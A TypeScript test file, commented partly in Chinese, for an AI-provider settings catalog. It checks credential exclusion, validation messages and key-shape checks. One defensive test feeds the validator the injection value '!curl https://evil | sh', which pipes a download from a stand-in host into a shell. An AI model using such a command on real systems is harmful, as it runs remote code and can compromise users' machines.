import assert from "node:assert/strict";
import { test } from "node:test";

import {
  CUSTOM_MODEL_CONTEXT_WINDOW,
  customProviderConfig,
  projectCredentialProviders,
  validateCredentialShape,
  validateExecutorSelection,
  type ExecutorCatalog,
} from "./catalog.js";
import { EMPTY_EXECUTOR_CACHE, type ExecutorCachedCustomProvider } from "./settings-cache.js";

const relay: ExecutorCachedCustomProvider = {
  id: "my-relay",
  name: "My relay",
  baseUrl: "https://relay.example/v1",
  api: "openai-completions",
  models: [{ id: "gpt-x", name: "GPT X" }],
  authHeader: true,
  keyless: false,
};

const catalog: ExecutorCatalog = {
  ready: true,
  error: "",
  providers: [
    { id: "anthropic", name: "Anthropic", custom: false, keyless: false },
    { id: "my-relay", name: "My relay", custom: true, keyless: false },
    { id: "ollama", name: "Ollama", custom: true, keyless: true },
  ],
  models: [
    { provider: "anthropic", providerName: "Anthropic", id: "claude-sonnet-5", name: "Claude Sonnet 5", contextWindow: 200_000, cost: { input: 3, output: 15 } },
    { provider: "my-relay", providerName: "My relay", id: "gpt-x", name: "GPT X", contextWindow: null, cost: null },
    { provider: "ollama", providerName: "Ollama", id: "llama3", name: "llama3", contextWindow: null, cost: null },
  ],
};

/**
 * The one thing in this file that is a security property rather than a nicety: a credential must
 * never reach `registerProvider`, because pi resolves its `apiKey`/`headers` as config values and a
 * `!`-prefixed one is executed as a shell command. The configuration is account-shared, so that
 * path would run commands on every desktop on the account.
 */
test("registerProvider 的入参里没有凭据，也没有 headers", () => {
  const config = customProviderConfig(relay) as Record<string, unknown>;
  assert.equal("apiKey" in config, false);
  assert.equal("headers" in config, false);
  assert.equal(config.baseUrl, "https://relay.example/v1");
  assert.equal(config.authHeader, true);
});

test("自定义模型补齐 pi 必填的元数据，而这些值是编出来的（所以 UI 显示未知）", () => {
  const models = customProviderConfig(relay).models;
  assert.equal(models.length, 1);
  assert.equal(models[0]!.contextWindow, CUSTOM_MODEL_CONTEXT_WINDOW);
  assert.deepEqual(models[0]!.cost, { input: 0, output: 0, cacheRead: 0, cacheWrite: 0 });
  assert.equal(models[0]!.reasoning, false);
  // 目录里对应的那条把它们表达成 null，而不是把占位数当规格。
  const entry = catalog.models.find((model) => model.provider === "my-relay");
  assert.equal(entry?.contextWindow, null);
  assert.equal(entry?.cost, null);
});

test("保存时的失败原因按成因分开，不合并成一句「配置无效」", () => {
  const base = { credentialProviders: ["anthropic"], customProviders: [relay] };
  // 两个都空不在这一串里：它现在是合法状态，见下一条。
  assert.equal(validateExecutorSelection(catalog, { ...base, provider: "", modelId: "" }).ok, true);
  assert.match(validateExecutorSelection(catalog, { ...base, provider: "anthropic", modelId: "" }).error, /选一个模型/);
  assert.match(validateExecutorSelection(catalog, { ...base, provider: "", modelId: "claude-sonnet-5" }).error, /选一个 provider/);
  assert.match(validateExecutorSelection(catalog, { ...base, provider: "nope", modelId: "x" }).error, /provider 不存在/);
  assert.match(validateExecutorSelection(catalog, { ...base, provider: "anthropic", modelId: "nope" }).error, /没有这个模型/);
  assert.equal(validateExecutorSelection(catalog, { ...base, provider: "anthropic", modelId: "claude-sonnet-5" }).ok, true);
});

/**
 * 两个都空是「还没选」，不是「填错了」：账号可以先有端点、后选模型，`deriveReadiness` 本来就这么表达。
 * 拒绝它就是这个 bug——加第一个自定义端点时提交的正是一份空选择，于是永远存不进中心。
 * 只空一半仍然拒绝：那是填了一半的表单，下游解析不出来。
 */
test("provider 与模型都还没选，是可以保存的状态，只给警告", () => {
  const verdict = validateExecutorSelection(catalog, {
    provider: "",
    modelId: "",
    credentialProviders: [],
    customProviders: [relay],
  });
  assert.equal(verdict.ok, true);
  assert.equal(verdict.error, "");
  assert.match(verdict.warning, /还没选 provider 与模型/);
});

/** 清除 key 就是一次没有 key 的保存；拒绝它等于让清除按钮按不动。状态区已经把「未就绪」说得很响。 */
test("没有凭据是警告不是拒绝，否则清除 key 无法完成", () => {
  const verdict = validateExecutorSelection(catalog, {
    provider: "my-relay",
    modelId: "gpt-x",
    credentialProviders: [],
    customProviders: [relay],
  });
  assert.equal(verdict.ok, true);
  assert.equal(verdict.error, "");
  assert.match(verdict.warning, /还没填 My relay 的 API key/);
});

test("keyless 端点没有 key 也算配好了", () => {
  const ollama: ExecutorCachedCustomProvider = { ...relay, id: "ollama", name: "Ollama", keyless: true, models: [{ id: "llama3", name: "llama3" }] };
  const verdict = validateExecutorSelection(catalog, {
    provider: "ollama",
    modelId: "llama3",
    credentialProviders: [],
    customProviders: [ollama],
  });
  assert.equal(verdict.ok, true);
  assert.equal(verdict.warning, "");
});

test("形如命令或环境变量名的 key 在输入这一层就被挡下（第二道防线）", () => {
  assert.equal(validateCredentialShape("!curl https://evil | sh").ok, false);
  assert.equal(validateCredentialShape("$ANTHROPIC_API_KEY").ok, false);
  assert.equal(validateCredentialShape("sk-ant with space").ok, false);
  assert.equal(validateCredentialShape("   ").ok, false);
  assert.equal(validateCredentialShape("sk-ant-1234").ok, true);
});

test("一次保存之后哪些 provider 还有凭据：空串是清除，缺席是不动", () => {
  const cached = { ...EMPTY_EXECUTOR_CACHE, present: true, credentials: { anthropic: "sk-a", "my-relay": "sk-r" } };
  assert.deepEqual(projectCredentialProviders(cached, {}), ["anthropic", "my-relay"]);
  assert.deepEqual(projectCredentialProviders(cached, { anthropic: "" }), ["my-relay"]);
  assert.deepEqual(projectCredentialProviders(cached, { openai: "sk-o" }), ["anthropic", "my-relay", "openai"]);
});
